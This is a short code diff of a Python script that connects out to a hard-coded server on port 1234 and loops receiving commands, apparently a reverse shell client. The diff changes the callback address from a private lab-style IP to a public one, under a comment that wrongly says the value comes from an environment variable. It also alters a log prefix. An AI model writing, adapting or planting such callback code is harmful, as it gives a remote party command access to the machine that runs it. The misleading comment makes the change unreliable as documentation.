@@ -2,7 +2,7 @@ import socket
 import subprocess
 import time
 
-SERVER_IP = "10.10.11.146"  # Replace with the actual server IP if different
+SERVER_IP = "52.22.11.146"  # This will be set by the environment variable
 SERVER_PORT = 1234
 
 def connect_back():
@@ -10,7 +10,7 @@ def connect_back():
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((SERVER_IP, SERVER_PORT))
-            print(f"[*] Connected to {SERVER_IP}:{SERVER_PORT}")
+            print(f"[+] Connected to {SERVER_IP}:{SERVER_PORT}")
 
             while True:
                 command = s.recv(1024).decode()
